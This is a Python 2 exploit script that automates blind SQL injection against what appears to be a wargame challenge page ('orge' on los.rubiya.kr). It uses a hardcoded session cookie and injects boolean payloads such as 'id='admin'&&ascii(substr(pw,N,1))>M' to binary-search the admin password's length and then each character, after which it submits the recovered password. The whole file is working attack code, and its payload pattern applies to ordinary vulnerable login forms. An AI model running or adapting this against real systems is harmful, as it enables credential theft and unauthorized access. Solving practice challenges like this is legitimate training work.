#!/usr/bin/env python

import urllib
import urllib2

URL = "https://los.rubiya.kr/chall/orge_bad2f25db233a7542be75844e314e9f3.php"
UA =  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36"
Cookie = "PHPSESSID=9i2i63lhcv8dc6ge2k4pbijlgm"


def query(Q):
    # print urllib.quote(Q)
    UURL = URL + "?pw=" + urllib.quote(Q)
    req = urllib2.Request(UURL, {}, {
        'User-Agent': UA,
        'Cookie': Cookie
    })

    res = urllib2.urlopen(req)

    return "<h2>Hello admin</h2>" in res.read()

def find_length():
    left = 0
    right = 200 # (left, right]
    while left < right:
        mid = (left+right)//2
        print "Finding... {} {} {}".format(left, mid, right)
        if query("123'||id='admin'&&length(pw)>{}-- ".format(mid)):
            left = mid+1
        else:
            right = mid
    return right

def find_ch(pos):
    print "Finding pos {} th character".format(pos)
    left = 0
    right = (1<<8)
    while left < right:
        mid = (left+right)//2
        print "Finding... {} {} {}".format(left, mid, right)
        if query("123'||id='admin'&&ascii(substr(pw,{},1))>{}-- ".format(pos, mid)):
            left = mid+1
        else:
            right = mid
    print "COOL!! {} = {}".format(pos, right)
    return right

LENGTH = find_length()
print "LENGTH = {}".format(LENGTH)
PASSWORD = ""
for i in range(1, LENGTH+1):
    PASSWORD += chr(find_ch(i))
    print PASSWORD

print PASSWORD

query(PASSWORD)
